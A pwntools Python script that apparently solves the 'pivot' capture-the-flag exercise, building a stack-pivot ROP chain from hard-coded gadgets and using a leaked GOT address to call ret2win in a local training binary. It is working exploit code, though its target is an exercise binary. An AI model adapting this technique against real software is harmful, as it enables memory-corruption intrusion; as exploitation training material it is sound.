from pwn import *

#gadgets from ropper
pop_rax = 0x0000000000400b00
xchg_rax_rsp = 0x0000000000400b02
mov_rax = 0x0000000000400b05 # mov rax, qword ptr[rax]
pop_rbp = 0x0000000000400900
add_rax_rbp = 0x0000000000400b09
call_rax = 0x000000000040098e 


elf = ELF('./pivot')
lib = ELF('./libpivot.so')

offset = 0x28*b'A'

r = process('./pivot')
s = r.recv()
s = s.split(b'\n')
pivot_stack = int(s[-3][-15:].strip(b'\n'), 16)

log.info(f'our pivoted stack will be at {hex(pivot_stack)}\n constructing payloads..')

#purpose of this payload is to pivot the stack to the malloc'd area where we have more space
payload1 = offset 
payload1 += p64(pop_rax) 
payload1 += p64(pivot_stack) 
payload1 += p64(xchg_rax_rsp)

#this payload calls foothold_function to populate it's got entry, then reads the populated got entry to count the address of ret2win and calls it with call rax
payload2 = p64(elf.symbols['plt.foothold_function']) 
payload2 += p64(pop_rax) 
payload2 += p64(elf.symbols['got.foothold_function'])
payload2 += p64(mov_rax) 
payload2 += p64(pop_rbp) 
payload2 += p64(lib.symbols['ret2win'] - lib.symbols['foothold_function']) 
payload2 += p64(add_rax_rbp)
payload2 += p64(call_rax)

log.info(f'sending second part of the payload...')
r.sendline(payload2)

log.info(f'sending first part of the payload..')
r.sendline(payload1)

s = r.recvuntil('libpivot.so')
s = r.recvline()
log.info(f'Got FLAG! {s}')

